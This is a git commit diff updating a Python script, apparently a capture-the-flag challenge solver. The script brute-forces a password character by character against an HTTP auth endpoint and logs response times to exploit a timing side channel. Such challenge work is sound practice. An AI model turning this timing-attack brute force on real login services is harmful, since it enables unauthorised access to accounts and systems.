08af66598309e26a80884de2f8c2190fd5ae1828
Denis Astahov <adv4000@gmail.com>
2019-05-12 11:37:44 -0700

    Update brute-post.py

--- Challenge1/brute-post.py
+++ Challenge1/brute-post.py
@@ -10,13 +10,19 @@
 import requests
 
 CHARACTERS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|\/?,.<>`~"
-URL    = "http://35.246.158.51:8070/auth/v1_1"
-HEADERS = {'User-Agent' : 'ed9ae2c0-9b15-4556-a393-23d500675d4b', 'content-type' : 'application/json; charset=utf-8' }
+URL        = "http://35.246.158.51:8070/auth/v1_1"
+HEADERS    = {'User-Agent' : 'ed9ae2c0-9b15-4556-a393-23d500675d4b', 'content-type' : 'application/json; charset=utf-8' }
+
+PAYLOAD ={}
 
 for i in range(len(CHARACTERS)):
-    JSONPAYLOAD = '{"Seed":"6711d2ec0d724396ad1570fcfb431443","Password":"' + CHARACTERS[i] + '"}'
-    r = requests.post(url=URL, data=JSONPAYLOAD, headers=HEADERS)
+    PAYLOAD['Seed']     = "6711d2ec0d724396ad1570fcfb431443"
+    PAYLOAD['Password'] = "" + CHARACTERS[i]
+
+    r = requests.post(url=URL, json=PAYLOAD, headers=HEADERS)
     result = r.json()
-    delay = result['Time']
-    print(JSONPAYLOAD + " - " + str(delay))
+    delay   = result['Time']
+    lockurl = result['LockURL']
+    isValid = result['IsValid']
+    print(str(PAYLOAD) + " - " + str(delay) + " - " + str(isValid) + " -> " + str(lockurl))
 
